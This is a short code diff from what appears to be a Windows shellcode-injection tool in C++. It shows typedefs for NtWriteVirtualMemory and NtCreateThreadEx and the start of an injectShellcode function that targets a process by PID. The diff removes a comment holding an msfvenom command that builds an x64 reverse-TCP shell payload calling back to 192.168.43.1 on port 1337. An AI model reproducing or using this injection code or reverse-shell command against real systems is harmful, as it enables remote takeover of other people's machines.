@@ -11,9 +11,6 @@ using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, LPVOID Bas
 
 using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T ZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);
 
-/* msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.43.1 LPORT=1337 -f c */
-
-
 int injectShellcode(BOOL spawnProc, int PID, BOOL unsafe, char* shellcode, size_t shellsize) {
 
 	LPVOID allocation_start;
